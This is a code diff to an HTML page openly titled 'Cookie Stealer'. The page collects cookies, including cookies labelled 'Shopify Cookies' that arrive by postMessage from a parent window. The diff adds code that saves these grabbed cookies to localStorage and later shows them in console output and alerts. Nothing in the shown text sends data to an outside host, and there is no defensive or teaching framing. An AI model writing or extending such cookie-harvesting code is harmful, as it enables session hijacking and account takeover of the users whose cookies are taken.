@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cookie Stealers0000</title>
+    <title>Cookie Stealer</title>
 </head>
 <body>
     <script>
@@ -27,6 +27,8 @@
         // Listen for messages from the parent window
         window.addEventListener('message', function(event) {
             if (event.data && event.data.type === 'cookies') {
+                // Save cookies to localStorage
+                localStorage.setItem('lastGrabbedCookies', JSON.stringify(event.data.cookies));
                 alert('Shopify Cookies: ' + JSON.stringify(event.data.cookies));
             }
         });
@@ -38,6 +40,13 @@
         const cookies = getAllCookies();
         console.log('All Cookies:', cookies);
         alert('All Cookies: ' + JSON.stringify(cookies));
+
+        // Retrieve and display the last grabbed cookies from localStorage
+        const lastGrabbedCookies = localStorage.getItem('lastGrabbedCookies');
+        if (lastGrabbedCookies) {
+            console.log('Last Grabbed Cookies:', JSON.parse(lastGrabbedCookies));
+            alert('Last Grabbed Cookies: ' + lastGrabbedCookies);
+        }
     </script>
 </body>
 </html>
